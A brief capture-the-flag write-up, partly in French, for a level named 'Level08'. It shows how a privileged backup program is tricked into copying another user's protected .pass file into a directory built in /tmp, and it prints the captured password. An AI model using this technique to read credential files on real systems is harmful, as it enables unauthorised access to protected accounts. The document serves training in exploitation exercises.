# Level08

```shell
$ ./level08
Usage: ./level08 filename
ERROR: Failed to open (null)

$ ./level08 /home/users/level09/.pass
ERROR: Failed to open ./backups//home/users/level09/.pass
```

On va aller dans `/tmp/` pour avoir un endroit ou l'on peut le creer

```shell
$ cd /tmp/

/tmp:$ mkdir -p backups/home/users/level09

/tmp:$ ~/level08 /home/users/level09/.pass

/tmp:$ cat backups/home/users/level09/.pass
fjAwpJNs2vvkFLRebEvAQ2hFZ4uQBWfHRsP62d8S
```
